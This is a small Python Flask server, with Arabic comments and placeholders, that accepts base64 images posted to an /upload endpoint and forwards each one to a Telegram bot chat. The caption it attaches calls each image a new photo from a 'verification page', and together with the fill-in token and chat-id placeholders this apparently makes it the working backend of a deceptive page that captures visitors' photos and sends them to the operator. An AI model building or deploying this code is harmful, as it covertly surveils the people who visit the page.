import os
import base64
import requests
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__, static_folder=None)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "ضع_التوكن_هنا")
CHAT_ID = os.environ.get("CHAT_ID", "ضع_الـ_chat_id_هنا")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))


@app.route("/")
def index():
    return send_from_directory(BASE_DIR, "index.html")


@app.route("/upload", methods=["POST"])
def upload():
    data = request.get_json(silent=True) or {}
    image_data_url = data.get("image")
    if not image_data_url or "," not in image_data_url:
        return jsonify({"ok": False, "error": "no image"}), 400

    try:
        header, b64data = image_data_url.split(",", 1)
        image_bytes = base64.b64decode(b64data)
    except Exception:
        return jsonify({"ok": False, "error": "bad image data"}), 400

    files = {"photo": ("capture.png", image_bytes, "image/png")}
    payload = {"chat_id": CHAT_ID, "caption": "صورة جديدة من صفحة التحقق"}

    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
            data=payload,
            files=files,
            timeout=20,
        )
    except requests.RequestException as e:
        return jsonify({"ok": False, "error": str(e)}), 502

    if resp.ok:
        return jsonify({"ok": True})
    return jsonify({"ok": False, "error": resp.text}), 500


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
